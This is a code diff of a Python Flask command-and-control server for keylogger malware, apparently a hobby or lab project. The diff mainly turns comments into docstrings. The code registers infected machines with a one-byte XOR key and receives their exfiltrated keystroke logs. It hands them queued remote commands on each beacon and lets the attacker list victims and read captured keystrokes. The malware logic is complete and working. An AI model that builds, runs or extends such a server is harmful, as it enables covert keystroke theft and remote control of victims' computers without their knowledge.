@@ -10,27 +10,27 @@ PLAIN_TEXT =   {'Content-Type': 'text/plain'}
 BYTES_FORMAT = {'Content-Type': 'application/octet-stream'}
 MAX_ACTIVE_TIME_BETWEEN_BEACON = 45
 
+
 class Cli():
     def __init__(self, id: str, os: str, arch: str, time_s: str, enc_key: bytes):
-        self.id = id
-        self.os_ = os
-        self.arch = arch
-        self.enc_key = enc_key
+        self.id = id       # client id    
+        self.os_ = os      # os version
+        self.arch = arch   # client architecture
+        self.enc_key = enc_key   # randomly generated encoding key
         self.commands, self.logs = [], []
-        self.last_beacon = float(time_s)  # stores as a timestamp
+        self.last_beacon = float(time_s)  # stores last beacon time
         self.beacon_diff = self.get_time_since_beacon()
         self.is_active = True
     
     def get_time_since_beacon(self):
-        # return the difference in seconds since last beacon
+        ' return the difference in seconds since last beacon'
         return time.time() - self.last_beacon
 
     def update_status(self):
-        # simply update the time since last beacon, if > 60 seconds set client as inactive
+        ' simply update the time since last beacon, if > 60 seconds set client as inactive '
         self.beacon_diff = self.get_time_since_beacon()
         self.is_active = self.beacon_diff <= MAX_ACTIVE_TIME_BETWEEN_BEACON
     
-    # add a command or log
     def add_command(self, cmd):
         self.commands.append(cmd)
 
@@ -48,26 +48,30 @@ class Cli():
 clients: dict[str, Cli] = {}
 
 
-# TARGETED BY: client
+
 @app.route('/register', methods=['GET'])
 def register():
+    ''' TARGETED BY: client
+    Function to register an infected machine 
+    '''
     id = request.args.get('id')
     os_ = request.args.get('os')
     arch = request.args.get('arch')
     time_s = request.args.get('time')
-    enc_key = os.urandom(1)  # random single byte key and make sure its unsigned!
+    enc_key = os.urandom(1)  # random single byte key
 
-    print(f'\n\nKEY: {enc_key.hex()}\n\n') # .hex()
+    # print(f'\n\nKEY: {enc_key.hex()}\n\n')
 
     clients[id] = Cli(id, os_, arch, time_s, enc_key)
     return Response(enc_key, status=200, content_type=BYTES_FORMAT)
 
 
-# TARGETED BY: client
-# the client targets their log and posts captured keys
-# if the client is not registered then return early
 @app.route('/logs/<cid>', methods=['POST'])
 def exfiltrate(cid):
+    ''' TARGETED BY: client
+    If the client is registered then recieve their keylog buffer,
+    decode the contents and add them to the clients logs 
+    '''
     if cid not in clients.keys():
         return '', 400
 
@@ -78,46 +82,47 @@ def exfiltrate(cid):
     return '', 200
 
 
-# TARGETED BY: client
 @app.route('/commands', methods=['GET'])
 def get_commands():
-    '''Endpoint serves as both command retrieval and beaconing. 
+    ''' TARGETED BY: client
+    Endpoint serves as both command retrieval and beaconing. 
     Requests come in the form /commands?cid=<cid>&time=<timstamp>
+    Server responds with the encoded commands to perform
     '''
     cid = request.args.get('cid')
     if cid not in clients.keys():
         return '', 400
 
-    # retieve client and update beacon information
-    client = clients[cid]
+    client = clients[cid]   # retieve client and update beacon information
     client.last_beacon = float(request.args.get('time'))
     client.update_status()
 
-    # if there are no commands to execute return nothing
-    if len(client.commands) == 0:
+    if len(client.commands) == 0:  # if there are no queued commands
         return '', 200
-
     encoded_commands = encode_commands(client)
     client.commands = []  # clear command log
     
     return Response(encoded_commands, status=200, content_type=BYTES_FORMAT)
 
 
-# TARGETED BY: attacker
 @app.route('/commands/<cid>', methods=['POST'])
 def add_command(cid):
+    ''' TARGETED BY: attacker 
+    Post a new command to the clients command queue
+    '''
     if cid not in clients.keys():
         return f'BAD REQ: <{cid}> is not registered.', 400, PLAIN_TEXT
     
     cmd = request.get_data(as_text=True)
     clients[cid].add_command(cmd)
-    return f'Successfully sent command to <{cid}>', 200, PLAIN_TEXT
+    return f'Successfully sent \'{cmd}\' to <{cid}>', 200, PLAIN_TEXT
 
-
-# TARGETED BY: attacker
 @app.route('/clients', methods=['GET'])
 def get_clients():
-    # ensure each clients information is up to date
+    ''' TARGETED BY: attacker 
+    Update all the client information to make sure it is 
+    up to date. Then return each of their information
+    '''
     for client in clients.values():
         client.update_status()
 
@@ -125,13 +130,20 @@ def get_clients():
     return '\n'.join(clis_as_strs), 200, PLAIN_TEXT
 
 
-# TARGETED BY: attacker
 @app.route('/logs/<cid>', methods=['GET'])
 def get_log(cid):
+    ''' TARGETED BY: attacker 
+    Retrieve the logs for a registered client
+    '''
     if cid not in clients.keys():
         return f'BAD REQ: <{cid}> is not registered.', 400, PLAIN_TEXT
+
+    logs_str = '\n'.join(
+        f'{i+1}: {log}' for i, log in
+        enumerate(clients[cid].logs)
+    )
     
-    return '\n'.join(clients[cid].logs), 200, PLAIN_TEXT
+    return logs_str, 200, PLAIN_TEXT
 
 
 
@@ -140,10 +152,14 @@ def get_log(cid):
 # -------------------------
 
 def encode_commands(client: Cli) -> bytes:
+    ''' Given a client, encode all of their queued commands,
+    each being seperated by a newline character
+    '''
     cmds_bytes = bytearray()
     num_cmds = len(client.commands)
     for i, cmd in enumerate(client.commands):
-        cmds_bytes.extend(encode(cmd, client.enc_key))
+        encoded_cmd = encode(cmd, client.enc_key)
+        cmds_bytes.extend(encoded_cmd)
         if i < num_cmds - 1:
             cmds_bytes.append(0x0A) # \n
     return bytes(cmds_bytes)
@@ -164,7 +180,10 @@ def decode(msg: bytes, key: bytes) -> str:
     return asym_xor(msg, key).decode('utf-8')
 
 def asym_xor(s: bytes, key: bytes) -> bytes:
-    ' symetric encoding helper function '
+    ''' symetric encoding function, iterate each element
+    in a byte array and perform the null-preserving xor 
+    using the circular right shift key
+    '''
     key = key[0]
     result = bytearray()
 
